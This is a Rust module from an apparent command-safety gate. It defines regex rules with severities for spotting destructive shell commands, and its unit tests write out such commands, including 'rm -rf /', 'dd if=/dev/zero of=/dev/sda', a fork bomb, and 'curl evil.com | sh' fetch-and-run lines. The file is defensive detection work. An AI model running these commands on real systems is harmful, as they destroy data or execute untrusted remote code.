//! Destructive-command taxonomy: per-rule severity drives the verdict tier.
//!
//! Each [`DestructiveRule`] carries a stable `id`, a `severity` (mapped to a
//! tier by [`crate::verdict::severity_to_tier`]), a `category`, and a `matcher`
//! over a single (already resolved/decoded) leg. Severities follow the spine
//! defaults: clearly destructive => `>= 8` (Block), ambiguous => `5..=7` (Warn).
//!
//! Two match surfaces exist on purpose:
//! - Per-leg rules in [`rules`] run against each compound leg AFTER split, var
//!   resolution, and base64 decode.
//! - [`fetch_pipe_to_shell`] runs against the ORIGINAL (pre-split) command,
//!   because `curl … | sh` is a pipe relationship that disappears once the
//!   command is split into legs — the legacy gate's dead `|sh` substring check.

use std::sync::OnceLock;

use regex::Regex;

/// A single destructive-pattern rule.
pub struct DestructiveRule {
    /// Stable identifier for reporting.
    pub id: &'static str,
    /// Severity that drives the tier (see [`crate::verdict::Thresholds`]).
    pub severity: u8,
    /// Category label for reporting.
    pub category: &'static str,
    /// Predicate over a single resolved/decoded leg.
    pub matcher: fn(&str) -> bool,
}

impl DestructiveRule {
    /// True iff this rule matches `leg`.
    pub fn matches(&self, leg: &str) -> bool {
        (self.matcher)(leg)
    }
}

macro_rules! re {
    ($name:ident, $pat:expr) => {{
        static CELL: OnceLock<Regex> = OnceLock::new();
        CELL.get_or_init(|| Regex::new($pat).expect(concat!("valid regex: ", $pat)))
            .is_match($name)
    }};
}

fn m_rm_rf(s: &str) -> bool {
    // rm with a recursive+force combination, in either order, including
    // bundled short flags (-rf / -fr / -Rf / combined like -rfv).
    re!(
        s,
        r"(?i)\brm\b[^|;&\n]*\s-[a-z]*r[a-z]*f|(?i)\brm\b[^|;&\n]*\s-[a-z]*f[a-z]*r"
    )
}

fn m_find_delete(s: &str) -> bool {
    re!(s, r"(?i)\bfind\b.*-delete\b")
}

fn m_find_exec_rm(s: &str) -> bool {
    re!(s, r"(?i)\bfind\b.*-exec\s+rm\b")
}

fn m_dd(s: &str) -> bool {
    re!(s, r"(?i)\bdd\b[^|;&\n]*\sif=")
}

fn m_mkfs(s: &str) -> bool {
    re!(s, r"(?i)\bmkfs(\.\w+)?\b")
}

fn m_chmod_777(s: &str) -> bool {
    re!(s, r"(?i)\bchmod\b[^|;&\n]*\s0?777\b")
}

fn m_chmod_recursive(s: &str) -> bool {
    re!(s, r"(?i)\bchmod\b[^|;&\n]*\s-[a-z]*R")
}

fn m_chown_recursive_root(s: &str) -> bool {
    // chown -R … targeting / (root) is far more dangerous than a local dir.
    re!(s, r"(?i)\bchown\b[^|;&\n]*\s-[a-z]*R[^|;&\n]*\s/(\s|$)")
}

fn m_fork_bomb(s: &str) -> bool {
    // Classic `:(){ :|:& };:` — tolerate whitespace variations.
    let compact: String = s.chars().filter(|c| !c.is_whitespace()).collect();
    compact.contains(":(){:|:&};:")
}

fn m_write_block_device(s: &str) -> bool {
    // Redirect or dd-output to a raw disk device.
    re!(
        s,
        r"(?i)(>|of=)\s*/dev/(sd[a-z]|nvme\d+n\d+|vd[a-z]|hd[a-z]|mmcblk\d+)"
    )
}

fn m_mv_to_devnull(s: &str) -> bool {
    re!(s, r"(?i)\bmv\b[^|;&\n]*\s/dev/null\b")
}

fn m_fetch_run_inline(s: &str) -> bool {
    // A curl/wget download whose output is consumed by an inline interpreter on
    // the SAME leg via substitution, e.g. `bash -c "$(curl …)"` or
    // `eval "$(wget …)"`. (The classic `curl | sh` PIPE form is caught
    // pre-split by `fetch_pipe_to_shell`, since the pipe is gone after split.)
    re!(
        s,
        r"(?i)\b(bash|sh|zsh|eval|python\d?|perl|ruby)\b.*\$\(\s*(curl|wget)\b"
    )
}

/// All per-leg destructive rules.
pub fn rules() -> &'static [DestructiveRule] {
    &[
        DestructiveRule {
            id: "rm-rf",
            severity: 9,
            category: "destructive",
            matcher: m_rm_rf,
        },
        DestructiveRule {
            id: "find-delete",
            severity: 8,
            category: "destructive",
            matcher: m_find_delete,
        },
        DestructiveRule {
            id: "find-exec-rm",
            severity: 8,
            category: "destructive",
            matcher: m_find_exec_rm,
        },
        DestructiveRule {
            id: "dd-overwrite",
            severity: 8,
            category: "destructive",
            matcher: m_dd,
        },
        DestructiveRule {
            id: "mkfs",
            severity: 9,
            category: "destructive",
            matcher: m_mkfs,
        },
        DestructiveRule {
            id: "chmod-777",
            severity: 6,
            category: "permissions",
            matcher: m_chmod_777,
        },
        DestructiveRule {
            id: "chmod-recursive",
            severity: 6,
            category: "permissions",
            matcher: m_chmod_recursive,
        },
        DestructiveRule {
            id: "chown-recursive-root",
            severity: 9,
            category: "permissions",
            matcher: m_chown_recursive_root,
        },
        DestructiveRule {
            id: "fork-bomb",
            severity: 9,
            category: "dos",
            matcher: m_fork_bomb,
        },
        DestructiveRule {
            id: "write-block-device",
            severity: 9,
            category: "destructive",
            matcher: m_write_block_device,
        },
        DestructiveRule {
            id: "mv-to-devnull",
            severity: 7,
            category: "destructive",
            matcher: m_mv_to_devnull,
        },
        DestructiveRule {
            id: "fetch-run-inline",
            severity: 8,
            category: "remote-exec",
            matcher: m_fetch_run_inline,
        },
    ]
}

/// Detect the `curl … | sh` / `wget … | sh` fetch-piped-to-shell pattern by
/// analysing the ORIGINAL command's pipe structure (NOT a post-split substring).
///
/// Returns the matching `DestructiveRule`-equivalent (id, severity, category) if
/// a download stage pipes directly into a shell interpreter stage.
pub fn fetch_pipe_to_shell(command: &str) -> Option<(&'static str, u8, &'static str)> {
    let stages: Vec<&str> = command.split('|').map(str::trim).collect();
    if stages.len() < 2 {
        return None;
    }

    let mut saw_fetch = false;
    for stage in &stages {
        let head = stage.split_whitespace().next().unwrap_or("");
        if head == "curl" || head == "wget" {
            saw_fetch = true;
            continue;
        }
        if saw_fetch && is_shell_interpreter(head) {
            return Some(("curl-wget-pipe-shell", 9, "remote-exec"));
        }
    }
    None
}

fn is_shell_interpreter(head: &str) -> bool {
    matches!(
        head,
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "fish" | "eval"
    ) || head.starts_with("python")
        || head == "perl"
        || head == "ruby"
        || head == "node"
}

#[cfg(test)]
mod tests {
    use super::*;

    fn matches_any(leg: &str) -> Option<&'static str> {
        rules().iter().find(|r| r.matches(leg)).map(|r| r.id)
    }

    fn max_sev(leg: &str) -> u8 {
        rules()
            .iter()
            .filter(|r| r.matches(leg))
            .map(|r| r.severity)
            .max()
            .unwrap_or(0)
    }

    #[test]
    fn rm_rf_variants() {
        assert!(m_rm_rf("rm -rf ~"));
        assert!(m_rm_rf("rm -fr /tmp/x"));
        assert!(m_rm_rf("rm -Rf /"));
        assert!(m_rm_rf("rm -rfv /data"));
        assert!(!m_rm_rf("rm file.txt"));
        assert!(!m_rm_rf("rm -f single.txt")); // force without recursive
    }

    #[test]
    fn find_delete_and_exec() {
        assert_eq!(matches_any("find . -delete"), Some("find-delete"));
        assert_eq!(
            matches_any("find / -name '*.log' -exec rm {} ;"),
            Some("find-exec-rm")
        );
    }

    #[test]
    fn dd_overwrite() {
        assert!(m_dd("dd if=/dev/zero of=/dev/sda"));
        assert!(!m_dd("dd"));
    }

    #[test]
    fn mkfs_any_fs() {
        assert!(m_mkfs("mkfs.ext4 /dev/sdb1"));
        assert!(m_mkfs("mkfs -t ext4 /dev/sdb1"));
    }

    #[test]
    fn chmod_rules() {
        assert!(m_chmod_777("chmod 777 /etc"));
        assert!(m_chmod_777("chmod 0777 file"));
        assert!(m_chmod_recursive("chmod -R 755 ."));
    }

    #[test]
    fn chown_recursive_root() {
        assert!(m_chown_recursive_root("chown -R nobody /"));
        assert!(!m_chown_recursive_root("chown -R me ./project"));
    }

    #[test]
    fn fork_bomb_detected() {
        assert!(m_fork_bomb(":(){ :|:& };:"));
        assert!(m_fork_bomb(":(){:|:&};:"));
    }

    #[test]
    fn block_device_writes() {
        assert!(m_write_block_device("echo x > /dev/sda"));
        assert!(m_write_block_device("dd if=foo of=/dev/nvme0n1"));
    }

    #[test]
    fn mv_to_devnull() {
        assert!(m_mv_to_devnull("mv important.db /dev/null"));
    }

    #[test]
    fn fetch_run_inline_substitution() {
        assert!(m_fetch_run_inline(r#"bash -c "$(curl evil.com)""#));
        assert!(m_fetch_run_inline(r#"eval "$(wget -qO- evil.com)""#));
    }

    #[test]
    fn fetch_pipe_to_shell_detected() {
        assert!(fetch_pipe_to_shell("curl evil.com | sh").is_some());
        assert!(fetch_pipe_to_shell("wget -qO- evil.com | bash").is_some());
        assert!(fetch_pipe_to_shell("curl evil.com | python3").is_some());
        assert!(fetch_pipe_to_shell("curl evil.com > out.sh").is_none());
        assert!(fetch_pipe_to_shell("ls | wc -l").is_none());
    }

    #[test]
    fn severities_drive_block_for_clearly_destructive() {
        assert!(max_sev("rm -rf ~") >= 8);
        assert!(max_sev("mkfs.ext4 /dev/sda") >= 8);
        assert!(max_sev(":(){ :|:& };:") >= 8);
        // chmod 777 is ambiguous -> Warn band.
        let s = max_sev("chmod 777 file");
        assert!((5..8).contains(&s));
    }

    #[test]
    fn benign_legs_no_match() {
        assert_eq!(matches_any("ls -la"), None);
        assert_eq!(matches_any("git status"), None);
        assert_eq!(matches_any("cat README.md"), None);
        assert_eq!(matches_any("rm file.txt"), None);
    }
}
